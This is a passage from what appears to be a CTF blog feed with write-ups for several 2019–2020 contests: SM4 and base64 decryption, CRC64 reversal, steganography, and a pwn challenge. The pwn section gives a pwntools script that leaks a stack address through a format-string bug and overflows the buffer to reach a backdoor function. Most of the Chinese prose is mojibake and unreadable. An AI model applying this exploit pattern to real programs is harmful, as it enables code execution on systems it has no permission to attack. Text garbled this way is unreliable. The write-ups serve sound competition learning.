class="number">41</span>, <span class="number">36</span>,</span><br><span class="line"> <span class="number">14</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">47</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">56</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; a[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line"><span class="keyword">if</span>(a[i] == s[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = j;</span><br><span class="line"><span class="keyword">if</span>(t &lt;= <span class="number">25</span>)</span><br><span class="line">t += <span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(t &lt;= <span class="number">51</span>)</span><br><span class="line">t -= <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">64</span>; k++)</span><br><span class="line"><span class="keyword">if</span>((k+<span class="number">24</span>)%<span class="number">64</span> == t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(s[k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿˜åŸä¸ºæ­£å¸¸base64åŠ å¯†å¯†æ–‡ï¼šMTIzNDU2</span></span><br></pre></td></tr></table></figure><p>æ­£å¸¸base64è§£å¯†ï¼šå¯ä»¥çœ‹åˆ°ï¼Œè§£å¯†å‡ºæ˜æ–‡ã€‚<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181032181.png" alt="image-20200815181032181"></p><p>å°±è¿™æ ·å¡ä½äº†ã€‚ã€‚ã€‚ä¹Ÿæ— å¿ƒçœ‹ç¬¬ä¸€ä¸ªåŠ å¯†äº†ã€‚</p><p>ä¸è¡Œï¼Œå»çœ‹äº†çœ‹writeupï¼ŒåŸæ¥è¿™ä¸ªè§£å¯†å‡ºæœ¬æ¥å°±æ˜¯ä¹±ç ï¼Œè½¬åŒ–ä¸º16è¿›åˆ¶å°±å¥½ã€‚ã€‚ã€‚åˆç›´æ¥çœ‹äº†ç¬¬ä¸€ä¸ªåŠ å¯†æ˜¯sm4ã€‚ã€‚</p><p>å®ƒåœ¨åŠ å¯†ä¸­å…¶å®æœ‰æ ‡å¿—çš„ï¼š<strong>ä¸€æ˜¯è¡¨ï¼ŒäºŒæ˜¯0xA3B1BAC6</strong><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181639575.png" alt="image-20200815181639575"></p><p><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181823633.png" alt="image-20200815181823633"></p><p>æœ€åpythonå®‰è£…pysm4è¿›è¡Œè§£å¯†ï¼š</p><p>é¦–å…ˆbase64è§£å¯†ä¸”è½¬åŒ–ä¸º16è¿›åˆ¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(c).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">s = <span class="string">"WdCVKQ3yQAYU9I0naQaHTg=="</span></span><br><span class="line">s1 = b64decode(s)</span><br><span class="line"></span><br><span class="line">ans = str_to_hex(s1)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>sm4è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="comment">#å¯†é’¥</span></span><br><span class="line">mk = <span class="number">0x77686572655f6172655f755f6e6f773f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯†æ–‡</span></span><br><span class="line">cipher_num = <span class="number">0x59d095290df2400614f48d276906874e</span></span><br><span class="line"></span><br><span class="line">clear_num = decrypt(cipher_num, mk)</span><br><span class="line">s = hex(clear_num)[<span class="number">2</span>:]</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(s[j]+s[j+<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]])</span><br><span class="line">print(hex_to_str(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flagï¼šSM4foRExcepioN?!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´DASCTFä¸ƒæœˆçº¿ä¸Šèµ›</title>
      <link href="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡ä¸€ä¸ªé€†å‘é¢˜éƒ½æ²¡åšï¼Œæ—¶é—´éƒ½ç”¨äºå¼„pwnç¯å¢ƒäº†ï¼ŒåšæŒå°±å¥½ï¼Œã€‚ä¸€ä¸ªpwnçš„ç­¾åˆ°é¢˜ï¼Œä¸€ä¸ªMISCã€‚èµ›åä¹ŸæŠŠé€†å‘é¢˜åšäº†åšã€‚</p><p>æ„Ÿå—ï¼šå› ä¸ºä¹‹å‰é‡è£…äº†Ubuntuï¼Œpwnçš„ç¯å¢ƒåæ¥ä¹Ÿæ²¡æ­ï¼Œå¼€å§‹ç°æ­ç¯å¢ƒçš„æ—¶å€™åˆé‡åˆ°ä¸å°‘é—®é¢˜ï¼Œå¤§å¤šæ•°æ—¶é—´éƒ½ç”¨åœ¨è¿™ä¸ªä¸Šé¢äº†ï¼Œæ¯”èµ›æ—¶é—´åˆä¸å¤šã€‚ã€‚ã€‚</p><a id="more"></a><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="è™šå‡ç­¾åˆ°"><a href="#è™šå‡ç­¾åˆ°" class="headerlink" title="è™šå‡ç­¾åˆ°"></a>è™šå‡ç­¾åˆ°</h3><p>checksecåï¼Œ32ä½æ–‡ä»¶ï¼Œåªæœ‰NXæ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ã€‚</p><p>è½½å…¥idaåå‘ç°æ˜æ˜¾çš„æ ˆæº¢å‡ºä¸æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œä¸”ä¿æŠ¤æ²¡æœ‰canaryï¼Œåœ¨ç¨‹åºçš„å­—ç¬¦ä¸­è¿˜å¯ä»¥çœ‹è§backdoorã€‚ä½†æ˜¯åˆ†ææ ˆç©ºé—´çš„æ—¶å€™å‘ç°å¤šå‡ºæ¥äº†ä¸ªå±€éƒ¨å˜é‡ã€‚<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726120631920.png" alt="image-20200726120631920"></p><p>ç„¶åæ¥ç€çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°è¿™ä¸ªå±€éƒ¨å˜é‡æœ‰ç€canaryçš„ç±»ä¼¼çš„ä½œç”¨ï¼Œå› ä¸ºç¨‹åºæœ€åè¦é å®ƒè·å¾—espï¼Œé‚£æˆ‘ä»¬æŠŠå®ƒéšä¾¿è¦†ç›–å€¼çš„è¯è‚¯å®šä¼šå¯¼è‡´ç¨‹åºè®¿é—®æ— æ•ˆåœ°å€å‡ºé”™ã€‚ä¸”ç¨‹åºåœ¨ä¸Šå›¾çš„rä¸sä¹‹é—´è¿˜å¤šå‡ºäº†16å­—èŠ‚çš„ç©ºé—´ã€‚<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121145913.png" alt="image-20200726121145913"></p><p>åœ¨gdbä¸­æ¸…æ™°çš„çœ‹åˆ°ï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121303857.png" alt="image-20200726121303857"></p><p>æ‰€ä»¥æŒ‰ç…§ä»¥å¾€æ”¹å˜è¿”å›åœ°å€æ¥æ§åˆ¶ç¨‹åºèµ°å‘çš„è¯è¦å¤šè¦†ç›–16å­—èŠ‚æ•°æ®ç„¶åé€šè¿‡ç¬¬äºŒæ¬¡æº¢å‡ºå°†è¦†ç›–çš„å±€éƒ¨å˜é‡æ”¹å˜å›åŸæ¥çš„å€¼ã€‚å†™è„šæœ¬æ”»å‡»ï¼Œå¤±è´¥ã€‚ã€‚ã€‚</p><p>åˆåˆ†æäº†æ ˆçš„åˆ†å¸ƒï¼Œæ²¡æœ‰é”™å•Šã€‚å‘ç°ç¨‹åºä¸­çš„æ ¼å¼åŒ–å­—ç¬¦æ¼æ´æˆ‘æ²¡æœ‰ç”¨ï¼Œæ‰æƒ³èµ·ç¨‹åºçš„æ ˆéšæœºåŒ–ã€‚æ¯æ¬¡åŠ è½½ç¨‹åºçš„æ ˆåœ°å€ä¸ä¸€æ ·ï¼Œæˆ‘ä¸èƒ½æŠŠgdbè°ƒè¯•çœ‹åˆ°çš„æ ˆåœ°å€åœ¨è„šæœ¬ä¸­ç”¨ã€‚</p><p>gdbæ‰¾ebp-4çš„ä½ç½®ã€‚<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726122351066.png" alt="image-20200726122351066"></p><p>å†æ¬¡è„šæœ¬æ”»å‡»æˆåŠŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./qiandao'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(<span class="string">"%13$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="number">0x24</span>*<span class="string">'a'</span> + p32(addr) + <span class="number">0x14</span>*<span class="string">'a'</span> + p32(<span class="number">0x0804857D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šè¿˜æ˜¯ç®€å•çš„æ ˆæº¢å‡ºï¼Œå¯¹æ ˆåœ°å€çš„ç¡®å®šå¯»æ‰¾å¢åŠ äº†ç‚¹éš¾åº¦ã€‚</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="welcome-to-the-misc-world"><a href="#welcome-to-the-misc-world" class="headerlink" title="welcome to the misc world"></a>welcome to the misc world</h3><p>é™„ä»¶ä¸‹è½½è§£å‹åä¸€å¼ pngå›¾ç‰‡ä¸ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…è¦å¯†ç ï¼Œæ˜¾ç„¶è¦ä»æ‰€ç»™pngå›¾ç‰‡æ‰¾å¯†ç ã€‚</p><p>pngå›¾ç‰‡æ˜¯åå­—çº¢è“çŒœæµ‹rbéšå†™ã€‚å› ä¸ºæ˜¯pngå›¾ç‰‡ç›´æ¥ä½¿ç”¨zstegå·¥å…·çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°éšè—äº†ä¸€å¼ å›¾ç‰‡ï¼Œæå–å‡ºæ¥å‘ç°å¯†ç ï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130546581.png" alt="image-20200726130546581"></p><p>ç”¨360å‹ç¼©æ‰“å¼€å‹ç¼©åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ntfséšå†™æµæ–‡æœ¬æ–‡ä»¶ï¼Œç›´æ¥è¾“å…¥å¯†ç æŸ¥çœ‹ï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130709679.png" alt="image-20200726130709679"></p><p>ä»¥ä¸ºæ˜¯flagï¼Œæäº¤ä½†æ˜¯é”™è¯¯çš„ï¼Œè¿™é‡Œå°±æ‡µäº†å¾ˆä¹…ã€‚ã€‚ã€‚</p><p>åé¢æƒ³åˆ°è¿˜æœ‰ä¸€ä¸ªhint.pngå›¾ç‰‡ï¼Œæ‰“å¼€çœ‹æ²¡ä»€ä¹ˆï¼Œæ‹–è¿›010editorå‘ç°æœ€åæœ‰ä¸€é•¿æ®µå­—ç¬¦ï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132148398.png" alt="image-20200726132148398"></p><p>ä»å­—ç¬¦ç»„æˆçŒœæµ‹æ˜¯base64ï¼Œè§£ç åï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132234920.png" alt="image-20200726132234920"></p><p>ä»è¿™é‡Œæ˜ç¡®äº†å°±æ˜¯base64ç¼–ç ï¼Œä½†æ˜¯è§£å‡ºçš„ç¼–ç è¿˜æ˜¯ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆï¼Œä½†ç¡®å®šæ˜¯ä¸€ç§ç¼–ç ï¼Œè¿›å…¥ç¼–ç ç½‘ç«™æŠŠè§‰å¾—ä¼šæ˜¯éƒ½è¯•äº†ä¸‹ï¼Œåœ¨escapeç¼–ç å‘ç°ï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132440317.png" alt="image-20200726132440317"></p><p>ç„¶åè®°å¾—æœ‰ä¸€ç§æ ¸å¿ƒä»·å€¼è§‚ç¼–ç ï¼Œåœ¨è¿™ä¸ªç¼–ç ç½‘ç«™ä¹Ÿæœ‰ï¼ˆçœŸçš„é½å…¨ï¼‰ï¼Œè§£ç åï¼š<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132629311.png" alt="image-20200726132629311"></p><p>é‚£ä¹ˆä¹‹å‰flagé‡Œçš„å†…å®¹å°±æ˜¯é€šè¿‡base85åŠ å¯†åçš„ï¼Œè§£å¯†base85å¾—åˆ°flag:<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132735367.png" alt="image-20200726132735367"></p><p>æ€»ç»“ï¼šç¼–ç æ–¹å¼çœ‹çš„å¤šäº†ï¼Œæœ‰ç»éªŒåå°±ä¼šå¾ˆå¿«ååº”è¿‡æ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020</title>
      <link href="/2020/07/10/SCTF2020/"/>
      <url>/2020/07/10/SCTF2020/</url>
      
        <content type="html"><![CDATA[<p>åšäº†ç‚¹æ‚é¡¹ğŸ˜ªã€‚ã€‚èµ›åè‚äº†ä¸‹é€†å‘ï¼Œä¸ä¼šçš„çœ‹äº†writeupå­¦ä¹ å­¦ä¹ ã€‚<a id="more"></a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥å¾ˆå¤§ï¼Œä¸€èˆ¬çš„exeæ–‡ä»¶éƒ½ä¸ä¼šè¿™ä¹ˆå¤§ï¼Œå¯ä»¥è€ƒè™‘æ˜¯ä»pyæ–‡ä»¶æ‰“åŒ…æˆçš„exeæ–‡ä»¶ã€‚</p><p>è½½å…¥idaçœ‹ä¸€ä¸‹å­—ç¬¦ä¸²ï¼Œæœ‰å¾ˆå¤špyå¼€å¤´çš„å’Œ__main__çš„ã€‚ä»ç»éªŒæ¥çœ‹ï¼Œè¿™æ˜¯pyinstalleræ‰“åŒ…çš„ã€‚ä½¿ç”¨<code>python    pyinstxtractor.py    signin.exe</code> è¿˜åŸpythonä»£ç ã€‚å¯¹å…¶ä¸­mainæ–‡ä»¶è¿›è¡Œæ–‡ä»¶å¤´è¡¥é½ï¼Œç„¶åä½¿ç”¨<code>uncompyle6 -o main.py main.pyc</code>å°†.pycè½¬åŒ–ä¸º.pyæ–‡ä»¶ã€‚</p><p>ä½†æ˜¯ç”±äºè¿™æ˜¯python3.8å†™çš„pyæ–‡ä»¶ï¼Œå¦‚æœåœ¨python3.7ä¸‹ä½¿ç”¨uncompyle6ä¼šæç¤ºæ–‡ä»¶æœ‰æŸï¼Œä½¿ç”¨python3.8ã€‚å»å‡çº§äº†python3.8åã€‚<img src="/2020/07/10/SCTF2020/image-20200714101947068.png" alt="image-20200714101947068"></p><p>æ‰“å¼€pyæ–‡ä»¶ï¼Œç¨‹åºå¯åŠ¨ä¼šé‡Šæ”¾ä¸€ä¸ªdllæ–‡ä»¶ï¼ˆè¿™åœ¨è¿è¡Œç¨‹åºçš„æ—¶å€™å¯ä»¥çœ‹åˆ°ï¼‰ã€‚æ•´ä½“é€»è¾‘è¿˜æ˜¯å¾ˆç®€å•ï¼Œé¦–å…ˆå°†ä¸€ä¸ªè´¦æˆ·ä»¥å­—å…¸å½¢å¼å­˜å‚¨ï¼Œç„¶åå°†æˆ‘ä»¬è¾“å…¥çš„nameä¸å¯†ç ä¼ å…¥dllæ–‡ä»¶çš„ä¸€ä¸ªåŠ å¯†å‡½æ•°åè¿”å›ï¼Œåˆ¤æ–­ä¸å­˜å‚¨çš„è´¦æˆ·æ˜¯å¦ç›¸ç­‰ã€‚</p><p>idaè½½å…¥dllæ–‡ä»¶çš„encåŠ å¯†å‡½æ•°ï¼šä¸€ä¸ªCRC64ä¸å¼‚æˆ–ã€‚<img src="/2020/07/10/SCTF2020/image-20200714102629777.png" alt="image-20200714102629777"></p><p>å¦‚æœä¹‹å‰æ¥è§¦è¿‡CRC64ï¼Œé‚£è¿™é‡Œå°±ä¼šå¾ˆç®€å•ã€‚ä½†æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæœ‰ç‚¹æ¼ç«ã€‚</p><p>é¦–å…ˆä½¿ç”¨pythonå¾—åˆ°å¼‚æˆ–ä¹‹å‰çš„keyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = list(base64.b64decode(<span class="string">b'PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA'</span>))</span><br><span class="line">t = <span class="string">"SCTFer"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">s[i] ^= ord(t[i%len(t)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><p>Cè¯­è¨€å†™CRC64è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] = &#123;<span class="number">111</span>, <span class="number">242</span>, <span class="number">150</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">156</span>, <span class="number">222</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">75</span>, <span class="number">51</span>, <span class="number">230</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">216</span>, <span class="number">183</span>, <span class="number">61</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">184</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">179</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">134</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">84</span>&#125;;</span><br><span class="line">_int64 *ans = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (_int64 *)(s+i);</span><br><span class="line"><span class="keyword">if</span>(*ans &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[j]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<img src="/2020/07/10/SCTF2020/image-20200714103110024.png" alt="image-20200714103110024"></p><p><strong>æ€»ç»“ï¼š1.CRC64åŠ å¯†ä¸è§£å¯†ã€‚2.åç¼–è¯‘pythonæ–‡ä»¶ã€‚</strong></p><h3 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h3><p>è¿è¡Œä¸€ä¸‹ï¼Œæç¤ºè¾“å…¥ä¸€ä¸ªwordã€‚è½½å…¥idaï¼Œshift+f12çœ‹åˆ°è¯¥å­—ç¬¦ä¸²ï¼Œæ¥åˆ°å¼•ç”¨çš„åœ°æ–¹ï¼š<img src="/2020/07/10/SCTF2020/image-20200714150947146.png" alt="image-20200714150947146"></p><p>è¿›å…¥sub_401df0ï¼šå¼€å§‹åªæ˜¯æ„Ÿè§‰å¤æ‚ï¼Œä½†çœ‹è§è¾“å…¥å•è¯åŠ å¯†åä¸<strong>32ä½çš„a-f+0-9</strong>çš„å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹æ˜¯md5åŠ å¯†ã€‚éšä¾¿æ‰¾äº†ä¸€ä¸ªcmd5ç½‘ç«™è§£å¯†ï¼š<img src="/2020/07/10/SCTF2020/image-20200714151246530.png" alt="image-20200714151246530"></p><p>ç»§ç»­çœ‹ä¸‹é¢çš„sub_402B00(â€œ.reiocâ€)keï¼šè¿›å…¥å¯ä»¥çœ‹åˆ°æ˜¯å…ˆè·å¾—image_baseï¼Œç„¶åä¾æ¬¡åŠ åœ°å€ï¼Œç›´åˆ°è·å¾—.reiocèŠ‚åŒºçš„é¦–åœ°å€ã€‚</p><p>æœ€åå¼•ç”¨è¾“å…¥çš„ï¼šsycsycå¯¹.reiocèŠ‚åŒºè¿›è¡Œäº†é‡å†™ã€‚è¿™é‡Œä½¿ç”¨idcpythonè„šæœ¬æˆ–è½½å…¥ODåŠ¨è°ƒéƒ½å¯ä»¥å¾—åˆ°æ”¹å†™åçš„èŠ‚åŒºã€‚</p><p>è½½å…¥ODï¼Œè°ƒè¯•å¯ä»¥å‘ç°é‡å†™çš„ä»£ç æ­£æ˜¯æ¥ä¸‹æ¥è¦æ‰§è¡Œçš„ï¼Œdumpå†è½½å…¥idaï¼š<img src="/2020/07/10/SCTF2020/image-20200714152255641.png" alt="image-20200714152255641"></p><p>å¯ä»¥çœ‹åˆ°ä¸ä¹‹å‰çš„ç±»ä¼¼ï¼Œä½†è¿™æ¬¡æ˜¯æ”¹å†™.ebataèŠ‚åŒºï¼Œä½¿ç”¨åŒæ ·çš„æ–¹æ³•ï¼ŒODä¸­dumpå‡ºè½½å…¥idaã€‚</p><p>è¿›å…¥æ”¹å†™.ebataåçš„æœ€åä¸€ä¸ªèŠ‚åŒºï¼š<img src="/2020/07/10/SCTF2020/image-20200714152729970.png" alt="image-20200714152729970"></p><p>çœ‹åŠ å¯†å‡½æ•°ï¼š<img src="/2020/07/10/SCTF2020/image-20200714152932947.png" alt="image-20200714152932947"></p><p>ä»ODåŠ¨è°ƒå¾—åˆ°è¡¨åå†™Cè¯­è¨€çˆ†ç ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 